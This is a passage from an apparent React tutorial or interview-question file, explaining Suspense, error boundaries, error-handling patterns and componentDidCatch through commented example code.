      <p>Rating: {show.rating.average}/10</p>
      
      {/* Nested Suspense for episodes * /}
      <Suspense fallback={<p>Loading episodes for {show.name}...</p>}>
        <ShowEpisodes />
      </Suspense>
    </div>
  );
}

function App() {
  return (
    <div>
      <h1>Show Details</h1>
      
      <Suspense fallback={<p>Loading show details...</p>}>
        <ShowDetails />
      </Suspense>
    </div>
  );
}

// Flow:
// 1. Shows "Loading show details..."
// 2. Show details load -> display them
// 3. Shows "Loading episodes for [show]..."
// 4. Episodes load -> display them
// Progressive loading!

Error Boundaries with Suspense:
--------------------------------

import { ErrorBoundary } from 'react-error-boundary';

function ErrorFallback({ error, resetErrorBoundary }) {
  return (
    <div>
      <h2>Something went wrong</h2>
      <p>{error.message}</p>
      <button onClick={resetErrorBoundary}>Try again</button>
    </div>
  );
}

function App() {
  return (
    <ErrorBoundary FallbackComponent={ErrorFallback}>
      <Suspense fallback={<Loading />}>
        <AsyncComponent />
      </Suspense>
    </ErrorBoundary>
  );
}

// ErrorBoundary catches errors from async operations
// Suspense handles loading states
// Clean separation of concerns

Suspense with React Router:
----------------------------

import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Lazy load route components
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));
const Dashboard = lazy(() => import('./pages/Dashboard'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<PageLoader />}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/dashboard" element={<Dashboard />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// Each route loads only when navigated to
// Shows PageLoader while route component loads

Real-World Example: User Dashboard
-----------------------------------

const UserProfile = lazy(() => import('./UserProfile'));
const ActivityFeed = lazy(() => import('./ActivityFeed'));
const Recommendations = lazy(() => import('./Recommendations'));

function Dashboard() {
  return (
    <div className="dashboard">
      <header>
        <h1>Dashboard</h1>
      </header>
      
      {/* Critical content loads first * /}
      <Suspense fallback={<ProfileSkeleton />}>
        <UserProfile />
      </Suspense>
      
      <div className="content">
        {/* Secondary content loads separately * /}
        <Suspense fallback={<FeedSkeleton />}>
          <ActivityFeed />
        </Suspense>
        
        <Suspense fallback={<RecommendationsSkeleton />}>
          <Recommendations />
        </Suspense>
      </div>
    </div>
  );
}

// Benefits:
// - Header shows immediately
// - Profile loads and shows
// - Feed and Recommendations load independently
// - Better perceived performance

Suspense vs useEffect/useState:
--------------------------------

// Traditional approach with useEffect/useState
function TraditionalComponent() {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    async function fetchData() {
      try {
        const result = await fetch('https://api.example.com/data');
        const json = await result.json();
        setData(json);
        setLoading(false);
      } catch (error) {
        setError(error);
        setLoading(false);
      }
    }
    
    fetchData();
  }, []);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error.message}</div>;
  
  return <div>{data.map(item => <div key={item.id}>{item.name}</div>)}</div>;
}

// Suspense approach (with compatible data source)
function SuspenseComponent() {
  const data = dataResource.read(); // Suspends automatically
  
  return <div>{data.map(item => <div key={item.id}>{item.name}</div>)}</div>;
}

<Suspense fallback={<div>Loading...</div>}>
  <SuspenseComponent />
</Suspense>

// Advantages of Suspense:
// - Declarative (not imperative)
// - Less boilerplate
// - Coordinated loading states
// - Better code splitting
// - Centralized loading UI

Using Suspense with Libraries:
-------------------------------

// React Query with Suspense
import { QueryClient, QueryClientProvider, useQuery } from '@tanstack/react-query';

const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      suspense: true, // Enable Suspense mode
    },
  },
});

function Posts() {
  const { data } = useQuery({
    queryKey: ['posts'],
    queryFn: fetchPosts,
  });
  
  return data.map(post => <Post key={post.id} post={post} />);
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <Suspense fallback={<Loading />}>
        <Posts />
      </Suspense>
    </QueryClientProvider>
  );
}

// SWR with Suspense
import useSWR from 'swr';

function Profile() {
  const { data } = useSWR('/api/user', fetcher, { suspense: true });
  
  return <div>{data.name}</div>;
}

<Suspense fallback={<Loading />}>
  <Profile />
</Suspense>

Best Practices:
---------------

// 1. Use appropriate fallback UIs
<Suspense fallback={<Skeleton />}> {/* Better than spinner * /}
  <Content />
</Suspense>

// 2. Avoid too many Suspense boundaries
// ❌ Too granular
{items.map(item => (
  <Suspense key={item.id} fallback={<Spinner />}>
    <Item item={item} />
  </Suspense>
))}

// ✅ Group related content
<Suspense fallback={<ListSkeleton />}>
  {items.map(item => <Item key={item.id} item={item} />)}
</Suspense>

// 3. Show context in loading states
<Suspense fallback={<div>Loading {userName}'s posts...</div>}>
  <UserPosts />
</Suspense>

// 4. Use nested Suspense for progressive loading
<Suspense fallback={<PageSkeleton />}>
  <Header />
  <Suspense fallback={<ContentSkeleton />}>
    <MainContent />
  </Suspense>
</Suspense>

// 5. Combine with Error Boundaries
<ErrorBoundary fallback={<ErrorUI />}>
  <Suspense fallback={<Loading />}>
    <Component />
  </Suspense>
</ErrorBoundary>

Current Limitations (as of React 18):
--------------------------------------

// 1. Not all data fetching libraries support Suspense yet
// 2. Server-side rendering with Suspense requires React 18+
// 3. Error handling requires Error Boundaries
// 4. Need Suspense-compatible data sources

// Libraries with Suspense support:
// - React Router (lazy loading)
// - React Query (with suspense option)
// - SWR (with suspense option)
// - Relay (built-in)
// - Next.js 13+ (with App Router)

Summary:

React Suspense:
- Declarative loading states for async operations
- Wrap components with <Suspense fallback={...}>
- Component "suspends" by throwing promise
- Shows fallback while waiting
- Perfect for code splitting with React.lazy()
- Coordinate multiple async operations
- Nested boundaries for progressive loading
- Works with Error Boundaries
- Eliminates loading state boilerplate
- Improves user experience with coordinated loading
- Part of React 18 concurrent features
- Growing ecosystem support
- Future of async rendering in React
*/



/**
72. What are error boundaries?
------------------------------

Error boundaries are React components that catch JavaScript errors anywhere in their
child component tree, log those errors, and display a fallback UI instead of crashing
the entire app. They work like a JavaScript catch {} block but for components.

Why Error Boundaries:
---------------------

// Without error boundary: One error crashes entire app
function App() {
  return (
    <div>
      <Header />
      <BuggyComponent /> {/* Error here crashes everything! * /}
      <Footer />
    </div>
  );
}

// With error boundary: Error contained, rest of app works
function App() {
  return (
    <div>
      <Header />
      <ErrorBoundary fallback={<ErrorMessage />}>
        <BuggyComponent /> {/* Error here only affects this section * /}
      </ErrorBoundary>
      <Footer /> {/* Still works! * /}
    </div>
  );
}

Creating an Error Boundary:
----------------------------

import React from 'react';

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null, errorInfo: null };
  }
  
  // Catch errors during rendering
  static getDerivedStateFromError(error) {
    // Update state so next render shows fallback UI
    return { hasError: true };
  }
  
  // Log error details
  componentDidCatch(error, errorInfo) {
    // Log to error reporting service
    console.error('Error caught by boundary:', error);
    console.error('Error info:', errorInfo);
    
    // Store error details in state
    this.setState({
      error: error,
      errorInfo: errorInfo
    });
    
    // Send to error tracking service (e.g., Sentry)
    logErrorToService(error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      // Render fallback UI
      return (
        <div className="error-boundary">
          <h1>Something went wrong</h1>
          <p>We're sorry for the inconvenience.</p>
          {process.env.NODE_ENV === 'development' && (
            <details>
              <summary>Error details</summary>
              <pre>{this.state.error?.toString()}</pre>
              <pre>{this.state.errorInfo?.componentStack}</pre>
            </details>
          )}
          <button onClick={() => this.setState({ hasError: false })}>
            Try again
          </button>
        </div>
      );
    }
    
    // No error, render children normally
    return this.props.children;
  }
}

// Usage
<ErrorBoundary>
  <MyComponent />
</ErrorBoundary>

Error Boundary with Custom Fallback:
-------------------------------------

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    console.error('Error:', error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      // Use custom fallback from props
      return this.props.fallback;
    }
    
    return this.props.children;
  }
}

// Usage with custom fallback
<ErrorBoundary fallback={<h1>Something went wrong!</h1>}>
  <MyComponent />
</ErrorBoundary>

<ErrorBoundary fallback={<CustomErrorUI />}>
  <AnotherComponent />
</ErrorBoundary>

Error Boundary with Reset:
---------------------------

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  
  componentDidCatch(error, errorInfo) {
    console.error('Error:', error, errorInfo);
  }
  
  resetErrorBoundary = () => {
    this.setState({ hasError: false, error: null });
  };
  
  render() {
    if (this.state.hasError) {
      return (
        <div>
          <h1>Error occurred</h1>
          <p>{this.state.error?.message}</p>
          <button onClick={this.resetErrorBoundary}>
            Try again
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

What Error Boundaries Catch:
-----------------------------

✅ Error boundaries catch:

1. Errors during rendering
   
function BuggyComponent() {
  throw new Error('Rendering error!');
  return <div>Content</div>;
}

2. Errors in lifecycle methods

class BuggyComponent extends React.Component {
  componentDidMount() {
    throw new Error('Lifecycle error!');
  }
  
  render() {
    return <div>Content</div>;
  }
}

3. Errors in constructors

class BuggyComponent extends React.Component {
  constructor(props) {
    super(props);
    throw new Error('Constructor error!');
  }
  
  render() {
    return <div>Content</div>;
  }
}

What Error Boundaries DON'T Catch:
-----------------------------------

❌ Error boundaries do NOT catch:

1. Errors in event handlers

function BuggyComponent() {
  const handleClick = () => {
    throw new Error('Event handler error!'); // Not caught!
  };
  
  return <button onClick={handleClick}>Click</button>;
}

// Solution: Use try-catch
function SafeComponent() {
  const handleClick = () => {
    try {
      throw new Error('Event handler error!');
    } catch (error) {
      console.error('Caught:', error);
    }
  };
  
  return <button onClick={handleClick}>Click</button>;
}

2. Async code (setTimeout, promises)

function BuggyComponent() {
  useEffect(() => {
    setTimeout(() => {
      throw new Error('Timeout error!'); // Not caught!
    }, 1000);
  }, []);
  
  return <div>Content</div>;
}

// Solution: Use try-catch
function SafeComponent() {
  useEffect(() => {
    setTimeout(() => {
      try {
        throw new Error('Timeout error!');
      } catch (error) {
        console.error('Caught:', error);
      }
    }, 1000);
  }, []);
  
  return <div>Content</div>;
}

3. Server-side rendering errors

4. Errors in the error boundary itself

class BuggyErrorBoundary extends React.Component {
  componentDidCatch(error, errorInfo) {
    throw new Error('Error in error boundary!'); // Not caught!
  }
  
  render() {
    return this.props.children;
  }
}

Granular Error Boundaries:
---------------------------

// Wrap different parts of app with separate boundaries

function App() {
  return (
    <div>
      <Header />
      
      {/* Sidebar errors don't affect main content * /}
      <ErrorBoundary fallback={<div>Sidebar unavailable</div>}>
        <Sidebar />
      </ErrorBoundary>
      
      {/* Main content errors don't affect sidebar * /}
      <ErrorBoundary fallback={<div>Content unavailable</div>}>
        <MainContent />
      </ErrorBoundary>
      
      {/* Comments errors don't affect main content * /}
      <ErrorBoundary fallback={<div>Comments unavailable</div>}>
        <Comments />
      </ErrorBoundary>
      
      <Footer />
    </div>
  );
}

Error Boundary with Retry Logic:
---------------------------------

class RetryErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      hasError: false,
      retryCount: 0,
      maxRetries: 3
    };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    console.error('Error:', error, errorInfo);
  }
  
  handleReset = () => {
    const { retryCount, maxRetries } = this.state;
    
    if (retryCount < maxRetries) {
      this.setState({
        hasError: false,
        retryCount: retryCount + 1
      });
    }
  };
  
  render() {
    const { hasError, retryCount, maxRetries } = this.state;
    
    if (hasError) {
      if (retryCount >= maxRetries) {
        return (
          <div>
            <h1>Unable to load content</h1>
            <p>Maximum retry attempts reached.</p>
            <button onClick={() => window.location.reload()}>
              Reload page
            </button>
          </div>
        );
      }
      
      return (
        <div>
          <h1>Something went wrong</h1>
          <p>Retry attempt {retryCount + 1} of {maxRetries}</p>
          <button onClick={this.handleReset}>
            Try again
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

Using react-error-boundary Library:
------------------------------------

// Install: npm install react-error-boundary

import { ErrorBoundary } from 'react-error-boundary';

// Simple usage
function App() {
  return (
    <ErrorBoundary fallback={<div>Something went wrong</div>}>
      <MyComponent />
    </ErrorBoundary>
  );
}

// With custom fallback component
function ErrorFallback({ error, resetErrorBoundary }) {
  return (
    <div role="alert">
      <h2>Something went wrong:</h2>
      <pre>{error.message}</pre>
      <button onClick={resetErrorBoundary}>Try again</button>
    </div>
  );
}

function App() {
  return (
    <ErrorBoundary
      FallbackComponent={ErrorFallback}
      onReset={() => {
        // Reset app state
      }}
      onError={(error, errorInfo) => {
        // Log to error service
        console.error('Error:', error);
      }}
    >
      <MyComponent />
    </ErrorBoundary>
  );
}

// With reset keys (reset when key changes)
function App() {
  const [userId, setUserId] = useState(null);
  
  return (
    <ErrorBoundary
      FallbackComponent={ErrorFallback}
      resetKeys={[userId]} // Reset boundary when userId changes
    >
      <UserProfile userId={userId} />
    </ErrorBoundary>
  );
}

Error Boundaries in Production:
--------------------------------

class ProductionErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, errorId: null };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    // Generate unique error ID
    const errorId = generateErrorId();
    
    // Log to error tracking service (Sentry, LogRocket, etc.)
    logToErrorService({
      errorId,
      error: error.toString(),
      errorInfo: errorInfo.componentStack,
      userAgent: navigator.userAgent,
      url: window.location.href,
      timestamp: new Date().toISOString(),
      userId: getCurrentUserId(),
    });
    
    this.setState({ errorId });
  }
  
  render() {
    if (this.state.hasError) {
      return (
        <div className="error-page">
          <h1>We're sorry, something went wrong</h1>
          <p>Our team has been notified.</p>
          <p>Error ID: {this.state.errorId}</p>
          <button onClick={() => window.location.reload()}>
            Reload page
          </button>
          <button onClick={() => window.location.href = '/'}>
            Go to homepage
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

Testing Error Boundaries:
--------------------------

// Test component that throws error
function BombComponent({ shouldThrow }) {
  if (shouldThrow) {
    throw new Error('Boom!');
  }
  return <div>No error</div>;
}

// Test
import { render, screen } from '@testing-library/react';

test('error boundary catches error', () => {
  // Suppress error console logs in test
  const spy = jest.spyOn(console, 'error').mockImplementation(() => {});
  
  render(
    <ErrorBoundary fallback={<div>Error occurred</div>}>
      <BombComponent shouldThrow={true} />
    </ErrorBoundary>
  );
  
  expect(screen.getByText('Error occurred')).toBeInTheDocument();
  
  spy.mockRestore();
});

Best Practices:
---------------

// 1. Use multiple error boundaries for different sections
<ErrorBoundary fallback={<HeaderFallback />}>
  <Header />
</ErrorBoundary>

<ErrorBoundary fallback={<ContentFallback />}>
  <MainContent />
</ErrorBoundary>

// 2. Provide helpful error messages
<ErrorBoundary
  fallback={
    <div>
      <h1>Unable to load user profile</h1>
      <p>Please check your internet connection and try again.</p>
    </div>
  }
>
  <UserProfile />
</ErrorBoundary>

// 3. Log errors to monitoring service
componentDidCatch(error, errorInfo) {
  Sentry.captureException(error, { extra: errorInfo });
}

// 4. Show different UI in development vs production
render() {
  if (this.state.hasError) {
    if (process.env.NODE_ENV === 'development') {
      return <DetailedErrorUI error={this.state.error} />;
    }
    return <UserFriendlyErrorUI />;
  }
  return this.props.children;
}

// 5. Provide reset functionality
<button onClick={this.resetErrorBoundary}>Try again</button>


/**
73. How does React handle errors in components?
-----------------------------------------------

React has a comprehensive error handling system that prevents errors from crashing
the entire application. It uses error boundaries, lifecycle methods, and built-in
error handling mechanisms.

Error Handling Flow:
--------------------

1. Error occurs in component
   ↓
2. React catches error during render
   ↓
3. React looks for nearest error boundary
   ↓
4. Error boundary catches error
   ↓
5. getDerivedStateFromError called (update state)
   ↓
6. componentDidCatch called (log error)
   ↓
7. Error boundary renders fallback UI
   ↓
8. Rest of app continues working

Different Types of Errors:
---------------------------

// 1. Render Errors (caught by error boundaries)

function ComponentWithRenderError() {
  const user = null;
  return <div>{user.name}</div>; // TypeError: Cannot read property 'name' of null
}

<ErrorBoundary>
  <ComponentWithRenderError />
</ErrorBoundary>

// Error caught, fallback UI shown

// 2. Lifecycle Errors (caught by error boundaries)

class ComponentWithLifecycleError extends React.Component {
  componentDidMount() {
    throw new Error('Mount error');
  }
  
  render() {
    return <div>Content</div>;
  }
}

// 3. Event Handler Errors (NOT caught by error boundaries)

function ComponentWithEventError() {
  const handleClick = () => {
    throw new Error('Click error'); // Not caught by error boundary!
  };
  
  return <button onClick={handleClick}>Click</button>;
}

// Solution: Use try-catch
function SafeComponent() {
  const handleClick = () => {
    try {
      throw new Error('Click error');
    } catch (error) {
      console.error('Caught error:', error);
      // Show user-friendly message
      alert('An error occurred. Please try again.');
    }
  };
  
  return <button onClick={handleClick}>Click</button>;
}

// 4. Async Errors (NOT caught by error boundaries)

function ComponentWithAsyncError() {
  useEffect(() => {
    fetch('/api/data')
      .then(response => response.json())
      .catch(error => {
        // Handle error here
        console.error('Fetch error:', error);
      });
  }, []);
  
  return <div>Content</div>;
}

// 5. Promise Errors

function ComponentWithPromiseError() {
  useEffect(() => {
    async function fetchData() {
      try {
        const response = await fetch('/api/data');
        const data = await response.json();
        setData(data);
      } catch (error) {
        console.error('Error:', error);
        setError(error);
      }
    }
    
    fetchData();
  }, []);
  
  if (error) return <div>Error: {error.message}</div>;
  return <div>Content</div>;
}

Development vs Production Error Handling:
------------------------------------------

// Development Mode:
// - Detailed error messages
// - Component stack traces
// - Red error overlay
// - Console errors

// Production Mode:
// - User-friendly error messages
// - No stack traces shown to users
// - Errors logged to monitoring service
// - Graceful degradation

// Example: Conditional error display
class ErrorBoundary extends React.Component {
  state = { hasError: false, error: null };
  
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  
  render() {
    if (this.state.hasError) {
      // Development: Show detailed error
      if (process.env.NODE_ENV === 'development') {
        return (
          <div style={{ padding: '20px', background: '#ffebee' }}>
            <h1>Development Error</h1>
            <h2>{this.state.error?.message}</h2>
            <pre>{this.state.error?.stack}</pre>
          </div>
        );
      }
      
      // Production: Show friendly message
      return (
        <div>
          <h1>Oops! Something went wrong</h1>
          <p>We're working to fix the issue.</p>
          <button onClick={() => window.location.reload()}>
            Reload page
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

Error Handling Patterns:
-------------------------

// Pattern 1: Component-level error handling

function DataFetchingComponent() {
  const [data, setData] = useState(null);
  const [error, setError] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    async function fetchData() {
      try {
        setLoading(true);
        const response = await fetch('/api/data');
        
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const json = await response.json();
        setData(json);
        setError(null);
      } catch (err) {
        setError(err.message);
        setData(null);
      } finally {
        setLoading(false);
      }
    }
    
    fetchData();
  }, []);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  if (!data) return <div>No data</div>;
  
  return <div>{data.map(item => <div key={item.id}>{item.name}</div>)}</div>;
}

// Pattern 2: Custom error hook

function useAsyncError() {
  const [, setError] = useState();
  
  return useCallback((error) => {
    setError(() => {
      throw error; // This will be caught by error boundary
    });
  }, []);
}

// Usage
function Component() {
  const throwError = useAsyncError();
  
  const handleClick = async () => {
    try {
      await fetchData();
    } catch (error) {
      throwError(error); // Caught by error boundary
    }
  };
  
  return <button onClick={handleClick}>Fetch</button>;
}

// Pattern 3: Global error handler

window.addEventListener('error', (event) => {
  console.error('Global error:', event.error);
  // Log to error service
  logToSentry(event.error);
});

window.addEventListener('unhandledrejection', (event) => {
  console.error('Unhandled promise rejection:', event.reason);
  // Log to error service
  logToSentry(event.reason);
});

// Pattern 4: React Query error handling

import { useQuery } from '@tanstack/react-query';

function Component() {
  const { data, error, isLoading } = useQuery({
    queryKey: ['data'],
    queryFn: fetchData,
    retry: 3,
    onError: (error) => {
      // Handle error globally
      console.error('Query error:', error);
      toast.error('Failed to load data');
    }
  });
  
  if (isLoading) return <div>Loading...</div>;
  if (error) return <div>Error: {error.message}</div>;
  
  return <div>{data}</div>;
}

Error Recovery Strategies:
---------------------------

// 1. Retry mechanism

function ComponentWithRetry() {
  const [error, setError] = useState(null);
  const [retryCount, setRetryCount] = useState(0);
  
  const fetchData = async () => {
    try {
      const response = await fetch('/api/data');
      const data = await response.json();
      setData(data);
      setError(null);
    } catch (err) {
      setError(err);
      
      // Auto-retry up to 3 times
      if (retryCount < 3) {
        setTimeout(() => {
          setRetryCount(retryCount + 1);
          fetchData();
        }, 1000 * Math.pow(2, retryCount)); // Exponential backoff
      }
    }
  };
  
  if (error && retryCount >= 3) {
    return (
      <div>
        <p>Error: {error.message}</p>
        <button onClick={() => {
          setRetryCount(0);
          fetchData();
        }}>
          Try again
        </button>
      </div>
    );
  }
  
  return <div>Content</div>;
}

// 2. Fallback to cached data

function ComponentWithCache() {
  const [data, setData] = useState(null);
  const [error, setError] = useState(null);
  const cachedData = useRef(null);
  
  useEffect(() => {
    async function fetchData() {
      try {
        const response = await fetch('/api/data');
        const json = await response.json();
        setData(json);
        cachedData.current = json; // Cache successful data
        setError(null);
      } catch (err) {
        setError(err);
        // Fall back to cached data if available
        if (cachedData.current) {
          setData(cachedData.current);
        }
      }
    }
    
    fetchData();
  }, []);
  
  if (error && !data) return <div>Error: {error.message}</div>;
  if (error && data) {
    return (
      <div>
        <div className="warning">Showing cached data (offline)</div>
        {/* Render cached data * /}
      </div>
    );
  }
  
  return <div>{/* Render fresh data * /}</div>;
}

// 3. Graceful degradation

function ComponentWithDegradation() {
  const [enhancedFeatureAvailable, setEnhancedFeatureAvailable] = useState(true);
  
  useEffect(() => {
    async function loadEnhancedFeature() {
      try {
        await import('./EnhancedFeature');
      } catch (error) {
        console.error('Enhanced feature unavailable:', error);
        setEnhancedFeatureAvailable(false);
      }
    }
    
    loadEnhancedFeature();
  }, []);
  
  return (
    <div>
      {enhancedFeatureAvailable ? (
        <EnhancedFeature />
      ) : (
        <BasicFeature /> // Fallback to basic version
      )}
    </div>
  );
}

Error Logging Integration:
---------------------------

// Sentry integration
import * as Sentry from '@sentry/react';

Sentry.init({
  dsn: 'YOUR_SENTRY_DSN',
  integrations: [new Sentry.BrowserTracing()],
  tracesSampleRate: 1.0,
});

// Wrap app with Sentry error boundary
function App() {
  return (
    <Sentry.ErrorBoundary fallback={<ErrorFallback />}>
      <MyApp />
    </Sentry.ErrorBoundary>
  );
}

// LogRocket integration
import LogRocket from 'logrocket';

LogRocket.init('YOUR_APP_ID');

// In error boundary
componentDidCatch(error, errorInfo) {
  LogRocket.captureException(error, {
    extra: errorInfo
  });
}

Summary:

React Error Handling:
- Error boundaries catch render/lifecycle errors
- Use getDerivedStateFromError and componentDidCatch
- Event handler errors need try-catch
- Async errors need try-catch or .catch()
- Different handling for dev vs production
- Multiple strategies: retry, cache, degradation
- Integrate with error monitoring services
- Granular error boundaries for isolation
- Provide user-friendly error messages
- Log errors for debugging
*/


/**
74. What is componentDidCatch?
------------------------------

componentDidCatch is a lifecycle method in class components used for error handling.
It's called when an error is thrown in a descendant component. It receives the error
and additional information about which component threw the error.

Signature:
----------

componentDidCatch(error, errorInfo)

// error: The error that was thrown
// errorInfo: Object with componentStack property containing stack trace

Purpose:
--------

1. Log errors to error reporting services
2. Track error occurrences
3. Gather error context/metadata
4. Side effects related to errors

Note: For updating state, use getDerivedStateFromError instead

Basic Usage:
------------

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }
  
  static getDerivedStateFromError(error) {
    // Update state to show fallback UI
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    // Log error details
    console.error('Error caught:', error);
    console.error('Component stack:', errorInfo.componentStack);
    
    // Log to error service
    logErrorToService(error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      return <h1>Something went wrong.</h1>;
    }
    
    return this.props.children;
  }
}

Parameters Explained:
---------------------

componentDidCatch(error, errorInfo) {
  // error: The actual error object
  console.log('Error message:', error.message);
  console.log('Error stack:', error.stack);
  console.log('Error name:', error.name);
  
  // errorInfo: React-specific error info
  console.log('Component stack:', errorInfo.componentStack);
  
  /*
  Component stack looks like:
  
      in BuggyComponent (at App.js:10)
      in ErrorBoundary (at App.js:20)
      in div (at App.js:25)
      in App (at index.js:7)
  
  Shows where in component tree error occurred
  * /
}

Logging to Error Services:
---------------------------

// Example 1: Sentry
import * as Sentry from '@sentry/react';

componentDidCatch(error, errorInfo) {
  Sentry.withScope((scope) => {
    scope.setExtras(errorInfo);
    Sentry.captureException(error);
  });
}

// Example 2: LogRocket
import LogRocket from 'logrocket';

componentDidCatch(error, errorInfo) {
  LogRocket.captureException(error, {
    extra: {
      componentStack: errorInfo.componentStack
    }
  });
}

// Example 3: Custom logging service
componentDidCatch(error, errorInfo) {
  fetch('/api/log-error', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      error: {
        message: error.message,
        stack: error.stack,
        name: error.name
      },
      errorInfo: {
        componentStack: errorInfo.componentStack
      },
      userAgent: navigator.userAgent,
      url: window.location.href,
      timestamp: new Date().toISOString(),
      userId: getCurrentUserId()
    })
  });
}

Advanced Error Tracking:
-------------------------

class AdvancedErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      hasError: false,
      error: null,
      errorInfo: null,
      errorCount: 0,
      lastErrorTime: null
    };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  
  componentDidCatch(error, errorInfo) {
    const now = Date.now();
    const { lastErrorTime, errorCount } = this.state;
    
    // Track error frequency
    const timeSinceLastError = lastErrorTime ? now - lastErrorTime : Infinity;
    const newErrorCount = timeSinceLastError < 5000 ? errorCount + 1 : 1;
    
    this.setState({
      errorInfo,
      errorCount: newErrorCount,
      lastErrorTime: now
    });
    
    // Log with additional context
    this.logError({
      error,
      errorInfo,
      errorCount: newErrorCount,
      frequency: timeSinceLastError,
      props: this.props,
      state: this.state
    });
    
    // Alert if errors are happening frequently
    if (newErrorCount > 5) {
      console.warn('Multiple errors detected in short time!');
      // Maybe show different UI or take action
    }
  }
  
  logError(errorData) {
    console.error('Error details:', errorData);
    
    // Send to monitoring service
    if (window.errorMonitor) {
      window.errorMonitor.track(errorData);
    }
  }
  
  render() {
    const { hasError, error, errorCount } = this.state;
    
    if (hasError) {
      if (errorCount > 5) {
        return (
          <div>
            <h1>Multiple errors detected</h1>
            <p>Please reload the page.</p>
          </div>
        );
      }
      
      return (
        <div>
          <h1>Something went wrong</h1>
          <p>{error?.message}</p>
          <button onClick={() => this.setState({ hasError: false })}>
            Try again
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

getDerivedStateFromError vs componentDidCatch:
-----------------------------------------------

class ErrorBoundary extends React.Component {
  state = { hasError: false, error: null };
  
  // Called during RENDER phase
  // Pure function (no side effects)
  // Update state to show fallback
  static getDerivedStateFromError(error) {
    console.log('getDerivedStateFromError called');
    // ✅ Return new state
    return { hasError: true, error };
    
    // ❌ Don't do side effects here
    // Don't log to service
    // Don't call setState
  }
  
  // Called during COMMIT phase  
  // Can have side effects
  // Log errors, send to services
  componentDidCatch(error, errorInfo) {
    console.log('componentDidCatch called');
    // ✅ Side effects allowed
    logToService(error, errorInfo);
    
    // ✅ Can call setState (but usually use getDerivedStateFromError)
    this.setState({ errorInfo });
  }
  
  render() {
    if (this.state.hasError) {
      return <ErrorFallback error={this.state.error} />;
    }
    return this.props.children;
  }
}

// Order of execution:
// 1. Error thrown in child component
// 2. getDerivedStateFromError called (update state)
// 3. render called with new state (show fallback)
// 4. componentDidCatch called (log error)

User Context in Error Logs:
----------------------------

class ErrorBoundary extends React.Component {
  componentDidCatch(error, errorInfo) {
    // Gather user context
    const userContext = {
      userId: getUserId(),
      userName: getUserName(),
      userEmail: getUserEmail(),
      userRole: getUserRole(),
      accountType: getAccountType(),
      subscriptionStatus: getSubscriptionStatus()
    };
    
    // Gather app context
    const appContext = {
      route: window.location.pathname,
      userAgent: navigator.userAgent,
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight
      },
      timestamp: new Date().toISOString(),
      appVersion: process.env.REACT_APP_VERSION,
      environment: process.env.NODE_ENV
    };
    
    // Log everything
    logError({
      error: {
        message: error.message,
        stack: error.stack
      },
      errorInfo,
      userContext,
      appContext
    });
  }
  
  render() {
    // ...
  }
}

Error Boundary with Analytics:
-------------------------------

class AnalyticsErrorBoundary extends React.Component {
  componentDidCatch(error, errorInfo) {
    // Track error in analytics
    if (window.gtag) {
      window.gtag('event', 'exception', {
        description: error.message,
        fatal: true
      });
    }
    
    // Track in custom analytics
    if (window.analytics) {
      window.analytics.track('Error Occurred', {
        error: error.message,
        component: errorInfo.componentStack,
        page: window.location.pathname
      });
    }
    
    // Log to error service
    logToErrorService(error, errorInfo);
  }
  
  render() {
    // ...
  }
}

Limitations:
------------

// componentDidCatch does NOT catch:

// 1. Event handler errors
<button onClick={() => {
  throw new Error('Not caught!');
}}>
  Click
</button>

// 2. Async code
useEffect(() => {
  setTimeout(() => {
    throw new Error('Not caught!');
  }, 1000);
}, []);

// 3. Server-side rendering

// 4. Errors in error boundary itself

Best Practices:
---------------

// 1. Always use both methods
static getDerivedStateFromError(error) {
  return { hasError: true };
}

componentDidCatch(error, errorInfo) {
  logError(error, errorInfo);
}

// 2. Don't try to recover in componentDidCatch
componentDidCatch(error, errorInfo) {
  // ❌ Don't do this
  this.setState({ hasError: false }); // Trying to recover
  
  // ✅ Just log
  logError(error, errorInfo);
}

// 3. Include enough context
componentDidCatch(error, errorInfo) {
  logError({
    error,
    errorInfo,
    userId: getUserId(),
